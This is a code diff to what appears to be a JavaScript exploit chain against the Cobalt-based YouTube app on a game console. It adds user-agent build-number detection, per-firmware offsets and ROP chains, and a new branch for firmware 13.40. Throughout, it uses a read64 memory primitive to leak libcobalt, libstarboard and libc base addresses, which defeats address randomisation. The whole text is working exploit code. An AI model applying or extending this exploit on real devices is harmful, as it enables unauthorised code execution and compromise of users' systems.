@@ -29,6 +29,14 @@ function compare_version(a, b) {
     const bmin = bParts[1] || 0;
     return amaj === bmaj ? amin - bmin : amaj - bmaj;
 }
+    
+function get_cobalt_buildnumber() {
+    const match = navigator.userAgent.match(/Cobalt\/([\w.]+)-/);
+    if (!match) return null;
+    
+    const parts = match[1].split('.');
+    return parts[parts.length - 1];
+}
 
 (async function() {
     await load_localscript('global.js');
@@ -846,9 +854,10 @@ function trigger() {
         
         const text_leak = read64(stack_addr + 0x8n);
         await log("Text leak @ " + toHex(text_leak));
-        const text_leak_mask = text_leak & 0xFFFn;
         
-        if (text_leak_mask == 0x81Fn) {
+        const cbn = get_cobalt_buildnumber();
+        
+        if (cbn === "305777") {
             Y2_VERSION = "01.000.003 (min fw 4.03)";
             await log("Youtube " + Y2_VERSION + " detected");
             Y2_OFFSET = Y2_OFFSET_403;
@@ -860,7 +869,7 @@ function trigger() {
             libc_base = read64(eboot_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
             await log("libc_base @ " + toHex(libc_base));
             
-        } else if (text_leak_mask == 0xFDFn) {
+        } else if (cbn === "18441022") {
             Y2_VERSION = "01.000.030 (min fw 12.20)";
             await log("Youtube " + Y2_VERSION + " detected");
             Y2_OFFSET = Y2_OFFSET_1220;
@@ -875,11 +884,26 @@ function trigger() {
             libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
             await log("libc_base @ " + toHex(libc_base));
             
-        } else if (text_leak_mask == 0x73fn) {
+        } else if (cbn === "05730512") {
             Y2_VERSION = "01.009.202 (min fw 13.20)";
             await log("Youtube " + Y2_VERSION + " detected");
             Y2_OFFSET = Y2_OFFSET_1320;
             ROP = ROP_1320;
+
+            libcobalt_base = read64(stack_addr + 0x8n) - Y2_OFFSET.LIBCOBALT_LEAK;
+            await log("libcobalt_base @ " + toHex(libcobalt_base));
+            
+            libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
+            await log("libstarboard_base @ " + toHex(libstarboard_base));
+            
+            libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
+            await log("libc_base @ " + toHex(libc_base));
+            
+        } else if (cbn === "06170617") {
+            Y2_VERSION = "01.009.253 (min fw 13.40)";
+            await log("Youtube " + Y2_VERSION + " detected");
+            Y2_OFFSET = Y2_OFFSET_1340;
+            ROP = ROP_1340;
 
             libcobalt_base = read64(stack_addr + 0x8n) - Y2_OFFSET.LIBCOBALT_LEAK;
             await log("libcobalt_base @ " + toHex(libcobalt_base));
